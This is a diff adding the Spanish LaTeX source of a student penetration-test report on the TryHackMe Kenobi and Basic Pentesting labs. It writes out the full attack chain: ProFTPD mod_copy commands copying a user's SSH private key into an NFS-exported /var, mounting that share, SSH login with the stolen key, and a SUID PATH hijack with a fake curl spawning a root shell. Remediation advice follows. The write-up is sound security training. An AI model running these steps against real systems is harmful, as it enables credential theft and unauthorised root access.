+\hline
+22 & SSH & OpenSSH 8.2p1 Ubuntu\\
+\hline
+80 & HTTP & Apache 2.4.41 Ubuntu\\
+\hline
+111 & RPCbind & 2--4\\
+\hline
+139 & SMB & Samba\\
+\hline
+445 & SMB & Samba\\
+\hline
+2049 & NFS & NFS\\
+\hline
+35437 & Nlockmgr & 1--4\\
+\hline
+43057 & Mountd & 1--3\\
+\hline
+48695 & Mountd & 1--3\\
+\hline
+58469 & Mountd & 1--3\\
+\hline
+\end{tabular}
+\end{center}
+
+\evidence{
+evidencias/escaneo/escaneo_KB-03_nmap_servicios-01.png
+}{
+Identificación de servicios mediante Nmap.
+}
+
+\evidence{
+evidencias/escaneo/escaneo_KB-03_nmap_servicios-02.png
+}{
+Continuación del resultado de identificación de servicios.
+}
+
+\subsection{Enumeración NFS}
+
+Se consultaron los recursos NFS exportados mediante:
+
+\begin{lstlisting}
+showmount -e 10.64.134.243
+\end{lstlisting}
+
+El servidor indicó la exportación:
+
+\begin{lstlisting}
+/var *
+\end{lstlisting}
+
+\evidence{
+evidencias/escaneo/escaneo_KB-04_nfs_exports.png
+}{
+Recurso NFS exportado por el servidor.
+}
+
+También se consultaron los servicios RPC disponibles:
+
+\begin{lstlisting}
+rpcinfo -p 10.64.134.243
+\end{lstlisting}
+
+\evidence{
+evidencias/escaneo/escaneo_KB-05_rpcinfo.png
+}{
+Servicios RPC identificados en el objetivo.
+}
+
+Se utilizó además el script de Nmap para complementar la enumeración:
+
+\begin{lstlisting}
+nmap -p 2049 --script nfs-showmount 10.64.134.243
+\end{lstlisting}
+
+\evidence{
+evidencias/escaneo/escaneo_KB-06_nfs_showmount_script.png
+}{
+Consulta del servicio NFS mediante script de Nmap.
+}
+
+\subsection{Enumeración SMB}
+
+Se realizó una consulta de los recursos compartidos mediante:
+
+\begin{lstlisting}
+smbclient -L //10.64.134.243 -N
+\end{lstlisting}
+
+Se identificaron los recursos:
+
+\begin{itemize}
+    \item \texttt{print\$};
+    \item \texttt{anonymous};
+    \item \texttt{IPC\$}.
+\end{itemize}
+
+\evidence{
+evidencias/escaneo/escaneo_KB-07_smb_shares.png
+}{
+Recursos compartidos SMB identificados.
+}
+
+Posteriormente se accedió al recurso \texttt{anonymous} sin autenticación:
+
+\begin{lstlisting}
+smbclient //10.64.134.243/anonymous -N
+\end{lstlisting}
+
+Dentro del recurso se identificó el archivo:
+
+\begin{lstlisting}
+log.txt
+\end{lstlisting}
+
+\evidence{
+evidencias/escaneo/escaneo_KB-08_smb_anonymous_log.png
+}{
+Archivo log.txt identificado en el recurso SMB anonymous.
+}
+
+\subsection{Enumeración de ProFTPD}
+
+Se verificó el banner del servicio FTP:
+
+\begin{lstlisting}
+nc 10.64.134.243 21
+\end{lstlisting}
+
+El servicio respondió identificándose como:
+
+\begin{lstlisting}
+ProFTPD 1.3.5
+\end{lstlisting}
+
+\evidence{
+evidencias/escaneo/escaneo_KB-09_proftpd_banner.png
+}{
+Banner del servicio ProFTPD.
+}
+
+Posteriormente se realizó una búsqueda de vulnerabilidades y exploits
+públicamente documentados:
+
+\begin{lstlisting}
+searchsploit ProFTPD 1.3.5
+\end{lstlisting}
+
+La consulta identificó cuatro referencias relacionadas con la versión
+evaluada, incluyendo funcionalidades de \texttt{mod\_copy}.
+
+\evidence{
+evidencias/escaneo/escaneo_KB-10_searchsploit_proftpd.png
+}{
+Resultados de SearchSploit para ProFTPD 1.3.5.
+}
+
+% =========================================================
+% EXPLOTACIÓN
+% =========================================================
+
+\section{Explotación -- Kenobi}
+
+\subsection{Abuso controlado de mod\_copy}
+
+La funcionalidad \texttt{mod\_copy} de ProFTPD permitió realizar una
+operación controlada de copia dentro del entorno de laboratorio.
+
+Se utilizó la orden:
+
+\begin{lstlisting}
+SITE CPFR /home/kenobi/.ssh/id_rsa
+\end{lstlisting}
+
+seguida de:
+
+\begin{lstlisting}
+SITE CPTO /var/tmp/id_rsa
+\end{lstlisting}
+
+El servidor confirmó la copia del archivo hacia \texttt{/var/tmp}.
+
+\evidence{
+evidencias/explotacion/explotacion_KB-11_proftpd_modcopy.png
+}{
+Copia controlada de la clave privada SSH mediante mod\_copy.
+}
+
+\subsection{Acceso al recurso NFS}
+
+Debido a que el recurso \texttt{/var} se encontraba exportado mediante
+NFS, fue posible montarlo desde Kali:
+
+\begin{lstlisting}
+mkdir -p ~/TP_THM/mnt/kenobi_var
+sudo mount -t nfs 10.64.134.243:/var ~/TP_THM/mnt/kenobi_var
+\end{lstlisting}
+
+La clave copiada previamente fue localizada en:
+
+\begin{lstlisting}
+~/TP_THM/mnt/kenobi_var/tmp/id_rsa
+\end{lstlisting}
+
+\evidence{
+evidencias/explotacion/explotacion_KB-12_nfs_id_rsa.png
+}{
+Acceso a la clave privada copiada dentro del recurso NFS montado.
+}
+
+La clave fue copiada al entorno local y protegida mediante permisos
+restrictivos antes de utilizarla:
+
+\begin{lstlisting}
+cp ~/TP_THM/mnt/kenobi_var/tmp/id_rsa ~/TP_THM/id_rsa_kenobi
+chmod 600 ~/TP_THM/id_rsa_kenobi
+\end{lstlisting}
+
+\subsection{Acceso SSH como kenobi}
+
+La clave obtenida permitió establecer una conexión SSH con el usuario
+\texttt{kenobi}:
+
+\begin{lstlisting}
+ssh -i ~/TP_THM/id_rsa_kenobi kenobi@10.64.134.243
+\end{lstlisting}
+
+La identidad de la sesión fue verificada mediante:
+
+\begin{lstlisting}
+whoami
+\end{lstlisting}
+
+obteniéndose el usuario:
+
+\begin{lstlisting}
+kenobi
+\end{lstlisting}
+
+\evidence{
+evidencias/explotacion/explotacion_KB-13_ssh_kenobi-01.png
+}{
+Inicio de la conexión SSH como kenobi.
+}
+
+\evidence{
+evidencias/explotacion/explotacion_KB-13_ssh_kenobi-02.png
+}{
+Sesión SSH establecida como kenobi.
+}
+
+% =========================================================
+% POST-EXPLOTACIÓN
+% =========================================================
+
+\section{Post-explotación y escalada -- Kenobi}
+
+\subsection{Obtención de la flag de usuario}
+
+Una vez establecida la sesión como \texttt{kenobi}, se verificó la
+existencia del archivo correspondiente a la flag de usuario.
+
+Por motivos de seguridad y para evitar exponer el valor obtenido, la flag
+no se reproduce en texto plano en este informe.
+
+Su hash SHA-256 se documenta en el Anexo C.
+
+\evidence{
+evidencias/explotacion/explotacion_KB-14_user_flag.png
+}{
+Verificación de la flag de usuario en el laboratorio.
+}
+
+\subsection{Enumeración de binarios SUID}
+
+Se realizó una búsqueda de archivos con bit SUID:
+
+\begin{lstlisting}
+find / -perm -u=s -type f 2>/dev/null
+\end{lstlisting}
+
+Entre los resultados se identificó:
+
+\begin{lstlisting}
+/usr/bin/menu
+\end{lstlisting}
+
+El archivo pertenecía a \texttt{root} y presentaba el bit SUID activo.
+
+\evidence{
+evidencias/explotacion/explotacion_KB-15_suid_menu.png
+}{
+Identificación del binario SUID /usr/bin/menu.
+}
+
+\subsection{Análisis del binario SUID}
+
+Se analizaron las cadenas de texto del binario:
+
+\begin{lstlisting}
+strings /usr/bin/menu
+\end{lstlisting}
+
+El análisis permitió observar que el programa ejecutaba comandos
+relacionados con \texttt{curl}, entre otras operaciones.
+
+Se verificó además la ubicación del ejecutable:
+
+\begin{lstlisting}
+which curl
+\end{lstlisting}
+
+y el contenido del \texttt{PATH} de la sesión:
+
+\begin{lstlisting}
+echo \$PATH
+\end{lstlisting}
+
+El directorio personal de \texttt{kenobi} aparecía al inicio del
+\texttt{PATH}, antes de los directorios del sistema.
+
+\subsection{Escalada mediante manipulación controlada del PATH}
+
+Se creó un ejecutable denominado \texttt{curl} dentro del directorio
+controlado por el usuario:
+
+\begin{lstlisting}
+mkdir -p /home/kenobi/bin
+echo '#!/bin/sh' > /home/kenobi/bin/curl
+echo 'id' >> /home/kenobi/bin/curl
+chmod +x /home/kenobi/bin/curl
+\end{lstlisting}
+
+Posteriormente se ejecutó:
+
+\begin{lstlisting}
+/usr/bin/menu
+\end{lstlisting}
+
+La ejecución permitió comprobar que el comando era invocado con
+privilegios de \texttt{root}.
+
+\evidence{
+evidencias/explotacion/explotacion_KB-16_escalada_suid_path.png
+}{
+Demostración de ejecución con privilegios elevados mediante manipulación del PATH.
+}
+
+\subsection{Obtención de shell con privilegios}
+
+Para demostrar el impacto de la vulnerabilidad dentro del laboratorio,
+se reemplazó el contenido del ejecutable controlado para invocar
+\texttt{/bin/sh}:
+
+\begin{lstlisting}
+echo '#!/bin/sh' > /home/kenobi/bin/curl
+echo '/bin/sh' >> /home/kenobi/bin/curl
+chmod +x /home/kenobi/bin/curl
+\end{lstlisting}
+
+Luego se ejecutó nuevamente:
+
+\begin{lstlisting}
+/usr/bin/menu
+whoami
+\end{lstlisting}
+
+La sesión resultante correspondió al usuario:
+
+\begin{lstlisting}
+root
+\end{lstlisting}
+
+\evidence{
+evidencias/explotacion/explotacion_KB-17_shell_root.png
+}{
+Obtención de una shell con privilegios de root.
+}
+
+\subsection{Verificación de privilegios}
+
+Finalmente se verificó el acceso al archivo correspondiente a la flag
+de root.
+
+El valor de la flag no se reproduce en el informe. Se documenta su
+hash SHA-256 en el Anexo C.
+
+\evidence{
+evidencias/explotacion/explotacion_KB-18_root_flag_hash_redactada.png
+}{
+Verificación de la flag de root con el valor sensible redactado.
+}
+
+% =========================================================
+% HALLAZGOS KENOBI
+% =========================================================
+
+\section{Hallazgos -- Kenobi}
+
+\subsection{K-01 -- Exposición de recurso NFS}
+
+\findingbox{medium}{Severidad: MEDIA}{
+\textbf{ID:} K-01\\
+\textbf{Fase:} Escaneo / Enumeración\\
+\textbf{CWE:} CWE-732 -- Incorrect Permission Assignment for Critical Resource\\
+\textbf{CVE:} No aplica.
+}
+
+\subsubsection{Descripción}
+
+Se identificó un recurso NFS que exportaba el directorio:
+
+\begin{lstlisting}
+/var
+\end{lstlisting}
+
+La exportación estaba disponible para cualquier origen indicado por la
+configuración observada. La exposición del recurso permitió acceder desde
+el laboratorio a contenido ubicado dentro de \texttt{/var}, incluyendo el
+directorio \texttt{/var/tmp}.
+
+\subsubsection{Componente afectado}
+
+Servicio NFS y configuración de exportación del recurso \texttt{/var}.
+
+\subsubsection{Evidencia}
+
+\begin{itemize}
+    \item \texttt{escaneo\_KB-04\_nfs\_exports.png}
+    \item \texttt{escaneo\_KB-05\_rpcinfo.png}
+    \item \texttt{explotacion\_KB-12\_nfs\_id\_rsa.png}
+\end{itemize}
+
+\subsubsection{Impacto}
+
+Una exportación NFS excesivamente permisiva puede permitir acceso no
+autorizado a archivos del sistema y facilitar cadenas de ataque posteriores.
+
+\subsubsection{Salvaguardas recomendadas}
+
+\begin{itemize}
+    \item restringir los hosts autorizados a utilizar la exportación;
+    \item evitar exportar directorios del sistema sin necesidad operativa;
+    \item aplicar opciones de exportación restrictivas;
+    \item revisar periódicamente la configuración de NFS;
+    \item aplicar el principio de mínimo privilegio.
+\end{itemize}
+
+\subsubsection{Riesgo residual}
+
+Bajo, una vez restringido el acceso al recurso y revisados sus permisos.
+
+% ---------------------------------------------------------
+
+\subsection{K-02 -- Uso de mod\_copy para copiar una clave privada SSH}
+
+\findingbox{high}{Severidad: ALTA}{
+\textbf{ID:} K-02\\
+\textbf{Fase:} Explotación\\
+\textbf{CWE:} CWE-22 -- Improper Limitation of a Pathname to a Restricted Directory\\
+\textbf{CVE:} No aplica.
+}
+
+\subsubsection{Descripción}
+
+El servicio ProFTPD 1.3.5 expuesto en el puerto 21 permitió utilizar la
+funcionalidad \texttt{mod\_copy} para copiar una clave privada SSH desde
+\texttt{/home/kenobi/.ssh/id\_rsa} hacia \texttt{/var/tmp/id\_rsa}.
+
+Posteriormente, debido a la exportación NFS de \texttt{/var}, el archivo
+pudo ser recuperado desde el entorno de Kali.
+
+\subsubsection{Componente afectado}
+
+Servicio ProFTPD 1.3.5 y funcionalidad \texttt{mod\_copy}.
+
+\subsubsection{Evidencia}
+
+\begin{itemize}
+    \item \texttt{escaneo\_KB-09\_proftpd\_banner.png}
+    \item \texttt{escaneo\_KB-10\_searchsploit\_proftpd.png}
+    \item \texttt{explotacion\_KB-11\_proftpd\_modcopy.png}
+    \item \texttt{explotacion\_KB-12\_nfs\_id\_rsa.png}
+\end{itemize}
+
+\subsubsection{Impacto}
+
+La posibilidad de copiar archivos sensibles mediante un servicio de red
+puede permitir la exposición de credenciales o claves privadas y facilitar
+el acceso a cuentas del sistema.
+
+\subsubsection{Salvaguardas recomendadas}
+
+\begin{itemize}
+    \item actualizar o sustituir versiones vulnerables de ProFTPD;
+    \item deshabilitar funcionalidades no necesarias;
+    \item restringir el acceso al servicio FTP;
+    \item proteger las claves privadas con permisos adecuados y passphrases;
+    \item supervisar operaciones de copia y acceso sobre archivos sensibles.
+\end{itemize}
+
+\subsubsection{Riesgo residual}
+
+Bajo, una vez actualizado el servicio y eliminada la posibilidad de copiar
+archivos sensibles mediante funcionalidades innecesarias.
+
+% ---------------------------------------------------------
+
+\subsection{K-03 -- Escalada de privilegios mediante binario SUID y PATH}
+
+\findingbox{high}{Severidad: ALTA}{
+\textbf{ID:} K-03\\
+\textbf{Fase:} Post-explotación\\
+\textbf{CWE:} CWE-426 -- Untrusted Search Path\\
+\textbf{CVE:} No aplica.
+}
+
+\subsubsection{Descripción}
+
+Se identificó el binario SUID:
+
+\begin{lstlisting}
+/usr/bin/menu
+\end{lstlisting}
+
+El programa pertenecía a \texttt{root} y utilizaba comandos encontrados
+mediante el \texttt{PATH}. El directorio controlado por el usuario
+\texttt{/home/kenobi/bin} aparecía antes que los directorios del sistema.
+
+Esta condición permitió crear un ejecutable controlado por el usuario con
+el mismo nombre que el comando invocado por el programa y demostrar la
+ejecución con privilegios de \texttt{root}.
+
+\subsubsection{Componente afectado}
+
+Binario SUID \texttt{/usr/bin/menu} y configuración del \texttt{PATH}.
+
+\subsubsection{Evidencia}
+
+\begin{itemize}
+    \item \texttt{explotacion\_KB-15\_suid\_menu.png}
+    \item \texttt{explotacion\_KB-16\_escalada\_suid\_path.png}
+    \item \texttt{explotacion\_KB-17\_shell\_root.png}
+\end{itemize}
+
+\subsubsection{Impacto}
+
+La combinación de un binario SUID con una búsqueda de comandos basada en
+un \texttt{PATH} controlable por el usuario puede permitir ejecución de
+código con privilegios elevados.
+
+En la evaluación se demostró la obtención de una shell como
+\texttt{root}.
+
+\subsubsection{Salvaguardas recomendadas}
+
+\begin{itemize}
+    \item evitar el uso de \texttt{PATH} controlable por usuarios en
+    programas privilegiados;
+    \item utilizar rutas absolutas para ejecutar comandos;
+    \item revisar y reducir binarios SUID innecesarios;
+    \item aplicar el principio de mínimo privilegio;
+    \item realizar auditorías periódicas de permisos SUID.
+\end{itemize}
+
+\subsubsection{Riesgo residual}
+
+Bajo, una vez corregida la búsqueda de comandos y revisados los binarios
+con privilegios elevados.
+
+\subsection{Resumen de hallazgos}
+
+\begin{center}
+\begin{longtable}{|p{1.2cm}|p{4.4cm}|p{2.1cm}|p{3.2cm}|}
+\hline
+\textbf{ID} & \textbf{Hallazgo} & \textbf{Severidad} & \textbf{Impacto principal}\\
+\hline
+K-01 & Exposición de recurso NFS & Media & Confidencialidad / Integridad\\
+\hline
+K-02 & Uso de mod\_copy para copiar clave SSH & Alta & Confidencialidad / Integridad\\
+\hline
+K-03 & Escalada mediante SUID y PATH & Alta & Confidencialidad / Integridad\\
+\hline
+\end{longtable}
+\end{center}
+
+% =========================================================
+% RECOMENDACIONES KENOBI
+% =========================================================
+
+\section{Recomendaciones post-pentesting -- Kenobi}
+
+\subsection{Recomendaciones técnicas}
+
+\begin{itemize}
+    \item restringir las exportaciones NFS a los hosts estrictamente necesarios;
+    \item evitar exportar directorios del sistema cuando no exista una necesidad operativa;
+    \item actualizar ProFTPD y deshabilitar funcionalidades innecesarias;
+    \item restringir el acceso al servicio FTP;
+    \item proteger las claves privadas mediante permisos restrictivos y passphrases;
+    \item revisar todos los binarios SUID instalados;
+    \item utilizar rutas absolutas en programas ejecutados con privilegios elevados;
+    \item evitar que directorios controlados por usuarios precedan a rutas del sistema en
+    procesos privilegiados.
+\end{itemize}
+
+\subsection{Recomendaciones administrativas}
+
+\begin{itemize}
+    \item establecer revisiones periódicas de configuraciones NFS, FTP y SUID;
+    \item documentar los servicios expuestos y justificar su necesidad;
+    \item establecer procedimientos para la gestión y rotación de claves SSH;
+    \item mantener actualizado el software de infraestructura;
+    \item realizar evaluaciones periódicas de seguridad sobre servicios expuestos.
+\end{itemize}
+
+% =========================================================
+% CONTINGENCIA KENOBI
+% =========================================================
+
+\section{Protocolo de contingencia -- Kenobi}
+
+\subsection{Escenario de contingencia}
+
+Se considera como escenario de contingencia el compromiso de una cuenta
+mediante una cadena de explotación que combine exposición de servicios,
+acceso a una clave privada SSH y posterior escalada de privilegios.
+
+\subsection{Plan de respuesta}
+
+\begin{enumerate}
+    \item aislar temporalmente el sistema afectado;
+    \item revocar las claves SSH potencialmente comprometidas;
+    \item restringir o deshabilitar temporalmente los servicios FTP y NFS;
+    \item revisar los binarios SUID y corregir configuraciones inseguras del PATH;
+    \item preservar logs y evidencias;
+    \item actualizar o sustituir los componentes vulnerables;
+    \item restablecer credenciales y claves afectadas;
+    \item verificar los permisos de los recursos compartidos;
+    \item restaurar los servicios de manera controlada;
+    \item realizar una validación posterior antes de retornar a operación.
+\end{enumerate}
+
+\subsection{Objetivos de recuperación propuestos}
+
+Los siguientes valores se proponen exclusivamente como objetivos académicos
+para el ejercicio:
+
+\begin{center}
+\begin{tabular}{|c|c|p{8cm}|}
+\hline
+\textbf{Indicador} & \textbf{Valor propuesto} & \textbf{Descripción}\\
+\hline
+RTO & 4 horas & Tiempo objetivo para recuperar la operación principal.\\
+\hline
+RPO & 1 hora & Pérdida máxima de información aceptable considerada para el ejercicio.\\
+\hline
+\end{tabular}
+\end{center}
+
+% =========================================================
+% CONCLUSIONES KENOBI
+% =========================================================
+
+\section{Conclusiones -- Kenobi}
+
+La evaluación de la sala Kenobi permitió aplicar técnicas de reconocimiento,
+enumeración, explotación controlada y post-explotación dentro del entorno
+autorizado de TryHackMe.
+
+Se identificó una exportación NFS permisiva, un servicio ProFTPD 1.3.5 que
+permitió utilizar la funcionalidad \texttt{mod\_copy} para copiar una clave
+privada SSH y un binario SUID vulnerable a una manipulación del PATH.
+
+La combinación de estas condiciones permitió establecer una sesión SSH como
+\texttt{kenobi} y posteriormente demostrar una escalada de privilegios hasta
+\texttt{root}.
+
+Las recomendaciones propuestas se orientan a restringir los servicios
+expuestos, proteger las claves privadas, actualizar componentes vulnerables
+y eliminar condiciones que permitan la ejecución de comandos con privilegios
+elevados.
+
+% =========================================================
+% =========================================================
+
+% =========================================================
+\section{Conclusiones generales}
+
+La evaluación realizada sobre las salas Basic Pentesting y Kenobi permitió aplicar de manera práctica las distintas etapas de un proceso de pentesting dentro del entorno autorizado de TryHackMe.
+
+En Basic Pentesting se identificaron servicios expuestos, recursos compartidos accesibles y condiciones que permitieron obtener acceso SSH a un usuario del sistema y realizar tareas de enumeración posteriores.
+
+En Kenobi se identificaron servicios FTP, SMB y NFS expuestos, una configuración de ProFTPD que permitió utilizar 	\texttt{mod\_copy} para copiar una clave SSH y una condición de escalada de privilegios asociada a un binario SUID y al uso del PATH.
+
+Los resultados muestran la importancia de reducir la exposición de servicios, mantener actualizados los componentes, restringir recursos compartidos, proteger las credenciales y revisar cuidadosamente los mecanismos que ejecutan comandos con privilegios elevados. Las evidencias y bitácoras incluidas permiten respaldar las acciones realizadas durante la evaluación.
+
+% ANEXO A
+% =========================================================
+
+\newpage
+\section{Anexo A -- Bitácora}
+
+\subsection{Bitácora -- Basic Pentesting}
+
+La bitácora correspondiente al núcleo obligatorio registra los comandos
+utilizados durante la evaluación de la sala Basic Pentesting.
+
+\begin{lstlisting}
+\input{bitacora/clase_09_basic_pentesting.txt}
+\end{lstlisting}
+
+\subsection{Bitácora -- Kenobi}
+
+La bitácora correspondiente a la sala de elección registra los comandos
+utilizados durante la evaluación de la sala Kenobi.
+
+\begin{lstlisting}
+\input{bitacora/clase_10_kenobi.txt}
+\end{lstlisting}
+
+La bitácora no contiene contraseñas, claves privadas completas, tokens
+ni otros secretos.
+\newpage
+\section{Anexo B -- Evidencias}
+
+Las evidencias de la actividad se encuentran organizadas en:
+
+\begin{lstlisting}
+evidencias/
+\end{lstlisting}
+
+con las siguientes fases:
+
+\begin{itemize}
+    \item reconocimiento;
+    \item escaneo;
+    \item explotación;
+    \item post-explotación.
+\end{itemize}
+
+\subsection{Evidencia de finalización de las salas}
+
+La siguiente evidencia permite verificar el usuario utilizado y la finalización de las tres salas trabajadas en TryHackMe.
+
+\evidence{
+evidencias/reconocimiento/reconocimiento_THM_3_rooms_completadas.png
+}{
+Perfil de TryHackMe con el usuario camiluolivera2506 y las tres salas completadas.
+}
+
+Las evidencias documentan las fases de reconocimiento, escaneo, enumeración, explotación y post-explotación realizadas durante la evaluación de las salas Basic Pentesting y Kenobi.
+
+\subsection{Evidencias principales}
+
+\begin{center}
+\begin{tabularx}{\textwidth}{|l|X|}
+\hline
+\textbf{Archivo} & \textbf{Descripción}\\
+\hline
+\texttt{reconocimiento\_BP-04\_ping.png} & Conectividad con el objetivo.\\
+\hline
+\texttt{escaneo\_BP-03\_nmap-01.png} & Puertos y servicios identificados.\\
+\hline
+\texttt{escaneo\_BP-04\_gobuster80.png} & Enumeración de directorios web.\\
+\hline
+\texttt{escaneo\_BP-05\_development\_dev.png} & Información expuesta en dev.txt.\\
+\hline
+\texttt{escaneo\_BP-06\_development\_j.png} & Información expuesta en j.txt.\\
+\hline
+\texttt{escaneo\_H-04\_smb\_anonymous.png} & Acceso al recurso SMB.\\
+\hline
+\texttt{escaneo\_H-04\_smb\_staff.png} & Contenido de staff.txt.\\
+\hline
+\texttt{explotacion\_BP-05\_acceso\_ssh\_jan-01.png} & Inicio de acceso SSH.\\
+\hline
+\texttt{explotacion\_BP-05\_acceso\_ssh\_jan-02.png} & Sesión SSH como jan.\\
+\hline
+\texttt{explotacion\_BP-06\_enumeracion\_jan\_kay.png} & Enumeración de kay.\\
+\hline
+\texttt{explotacion\_BP-07\_kay\_ssh\_key.png} & Identificación de id\_rsa.\\
+\hline
+\texttt{explotacion\_BP-08\_kay\_id\_rsa\_encrypted.png} & Evidencia de cifrado de la clave.\\
+\hline
+\end{tabularx}
+\end{center}
+
+% =========================================================
+% ANEXO C
+% =========================================================
+
+\newpage
+\section{Anexo C -- Hashes de las flags obtenidas}
+
+Con el objetivo de documentar la obtención de las flags sin exponer su
+contenido en texto plano, se registran únicamente sus valores de hash
+SHA-256.
+
+\begin{center}
+\begin{tabularx}{\textwidth}{|p{5cm}|X|}
+\hline
+\textbf{Sala / evidencia} & \textbf{SHA-256} \\
+\hline
+Pentesting Fundamentals -- final &
+\texttt{583f30ba446f9f74d509726d25956b4b75ad965f953feffc996f6ad1382dc8d6} \\
+\hline
+Kenobi -- user &
+\texttt{3a8c5f64087db55e463965f4dc0d87ffeb9aa136ed06af15c5adecd63a4fca4d} \\
+\hline
+Kenobi -- root &
+\texttt{3d1bf13f01925a6069660340258d73427955c3327132c030be6e497930cb7ef8} \\
+\hline
+\end{tabularx}
+\end{center}
+
+Los valores fueron verificados mediante SHA-256 durante la actividad.
+No se incluyen las flags en texto plano, preservando la evidencia sin
+exponer directamente los valores obtenidos.
+
+% =========================================================
+% ANEXO D
+% =========================================================
+
+\newpage
+\section{Anexo D -- Declaración ética}
+
+Declaro que todas las actividades realizadas durante la presente evaluación
+se llevaron a cabo dentro del alcance autorizado, en entornos controlados y
+con fines exclusivamente académicos.
+
+Las técnicas utilizadas se limitaron al objetivo establecido para la
+actividad práctica y se procuró preservar la integridad del entorno y de la
+información observada.
+
+\textbf{Firma:} Camila Olivera \hfill \textbf{Fecha:} 30/09/2026
+
+\begin{tabular}{p{7cm}p{7cm}}
+\centering
+\rule{6cm}{0.4pt}\\
+\centering Firma
+&
+\centering
+\rule{6cm}{0.4pt}\\
+\centering Fecha
+\end{tabular}
+
+\vfill
+
+\begin{center}
+\textit{Fin del informe}
+\end{center}
+
+\end{document}
